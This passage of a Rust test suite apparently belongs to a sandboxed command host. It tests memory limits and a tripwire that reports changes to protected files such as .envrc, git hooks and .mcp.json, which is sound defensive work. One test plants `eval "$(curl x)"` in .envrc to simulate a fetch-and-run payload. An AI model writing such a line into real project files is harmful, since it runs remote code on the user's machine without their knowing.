    h.sandbox_available();
    let c = h.ok("configure", json!({ "roots": [r] }));
    assert!(c["memoryBound"].as_u64().unwrap() >= 1 << 30, "{c}");
    let bound: u64 = 128 << 20;
    let (f, d) = h.run(json!({ "argv": allocator(1024), "cwd": r, "memoryBound": bound }));
    assert_eq!(f["memoryBound"], bound);
    assert_eq!(d["killed"], "oom", "{d}");
    assert_eq!(d["ok"], false);
    assert_eq!(d["signal"], "SIGKILL");
    assert_eq!(d["memoryBound"], bound);
    let peak = d["peakFootprint"].as_u64().unwrap();
    assert!(peak > bound && peak < 768 << 20, "killed soon after the bound: {peak}");
    h.close();
}

#[test]
fn a_call_under_its_bound_runs_and_reports_its_peak() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let (_, d) = h.run(json!({ "argv": allocator(64), "cwd": r, "memoryBound": 512u64 << 20 }));
    assert_eq!(d["ok"], true, "{d}");
    assert_eq!(d["killed"], Value::Null);
    assert!(d["peakFootprint"].as_u64().unwrap() >= 48 << 20, "{d}");
    h.close();
}

#[test]
fn a_bound_is_clamped_to_the_persons_ceiling_and_a_floor() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r], "memoryMax": 1u64 << 30, "memoryBound": 256u64 << 20 }));
    let f = h.ok("spawn", json!({ "argv": ["true"], "cwd": r, "memoryBound": 8u64 << 30 }));
    assert_eq!(f["memoryBound"], 1u64 << 30, "a call cannot raise past the ceiling");
    let f = h.ok("spawn", json!({ "argv": ["true"], "cwd": r, "memoryBound": 1 }));
    assert_eq!(f["memoryBound"], 16u64 << 20);
    let f = h.ok("spawn", json!({ "argv": ["true"], "cwd": r }));
    assert_eq!(f["memoryBound"], 256u64 << 20);
    h.close();
}

// --- the tripwire: what changed among the protected names during a call (`protectedChanged`) ---

/// The names `protectedChanged` lists, with what happened to each.
fn changes(v: &Value) -> Vec<(String, String)> {
    v.as_array()
        .unwrap_or_else(|| panic!("protectedChanged is a list: {v}"))
        .iter()
        .map(|c| (c["name"].as_str().unwrap().to_string(), c["change"].as_str().unwrap().to_string()))
        .collect()
}

#[test]
fn done_reports_an_empty_list_when_nothing_protected_changed() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let (_, d) = h.run(json!({ "argv": ["sh", "-c", "echo x > README.md; mkdir -p target"], "cwd": r }));
    assert_eq!(d["protectedChanged"], json!([]), "present and empty, never absent: absent means an older host: {d}");
    h.close();
}

#[test]
fn done_reports_a_protected_change_made_during_the_call_by_anyone_and_never_reverts_it() {
    let (_d, r) = root();
    std::fs::create_dir_all(r.join(".git/hooks")).unwrap();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let id = marker_call(&mut h, &r, 1, json!({}));
    // Made by THIS process while the call runs: the tripwire reports what changed during the call, not by it.
    std::fs::write(r.join(".envrc"), "eval \"$(curl x)\"").unwrap();
    std::fs::write(r.join(".git/hooks/pre-push"), "#!/bin/sh\n").unwrap();
    let d = h.done(&id);
    assert_eq!(
        changes(&d["protectedChanged"]),
        vec![
            (".envrc".into(), "created".into()),
            (".git/hooks".into(), "modified".into()),
            (".git/hooks/pre-push".into(), "created".into()),
        ],
        "{d}"
    );
    assert_eq!(d["protectedChanged"][0]["root"], json!(r.to_string_lossy()));
    assert!(r.join(".envrc").exists() && r.join(".git/hooks/pre-push").exists(), "report-only: nothing is reverted");
    h.close();
}

#[test]
fn the_linux_floor_gap_is_reported_and_a_refused_write_reports_nothing() {
    let (_d, r) = root();
    let mut h = Host::start();
    if !h.sandbox_available() {
        return h.close();
    }
    h.ok("configure", json!({ "roots": [r] }));
    // No envelope: today's floor. The report matches what is on disk afterwards, on both OSes.
    let (_, d) = h.run(json!({ "argv": ["sh", "-c", "echo x > .envrc"], "cwd": r }));
    let reported = changes(&d["protectedChanged"]);
    if r.join(".envrc").exists() {
        assert_eq!(reported, vec![(".envrc".into(), "created".into())], "the floor's gap is reported: {d}");
    } else {
        assert_eq!(reported, vec![], "the sandbox refused the write, so nothing changed: {d}");
    }
    h.close();
}

#[test]
fn every_stage_of_a_pipe_reports_the_pipes_changes() {
    let (_d, r) = root();
    let mut h = Host::start();
    h.ok("configure", json!({ "roots": [r] }));
    let a = h.ok("spawn", json!({ "argv": ["sh", "-c", "touch started; sleep 1; echo a"], "cwd": r }))["id"]
        .as_str()
        .unwrap()
        .to_string();
    let b = h.ok("spawn", json!({ "argv": ["cat"], "cwd": r }))["id"].as_str().unwrap().to_string();
    h.ok("pipe", json!({ "ids": [a, b] }));
    assert!(appears(&r.join("started"), 5000));
    std::fs::write(r.join(".mcp.json"), "{}").unwrap();
    for id in [&a, &b] {
        let d = h.done(id);
        assert_eq!(changes(&d["protectedChanged"]), vec![(".mcp.json".into(), "created".into())], "{id}: {d}");
    }
    h.close();
}

#[test]
fn a_live_orphan_in_status_reports_what_changed_so_far() {
    let (_d, r) = root();
    let state = tempfile::tempdir().unwrap();
    let dir = state.path().join("owners");
    let mut h = Host::start_in(&dir, &[]);
    h.ok("configure", json!({ "roots": [r] }));
    marker_call(&mut h, &r, 3, json!({ "onOwnerLoss": "orphan", "orphanTimeoutMs": 60_000 }));
    h.close();
    std::fs::create_dir(r.join(".vscode")).unwrap();
    let mut next = Host::start_in(&dir, &[]);
    let st = next.ok("status", json!({}));
    let o = &st["orphans"][0];
    assert_eq!(changes(&o["protectedChanged"]), vec![(".vscode".into(), "created".into())], "{st}");
    next.close();
}
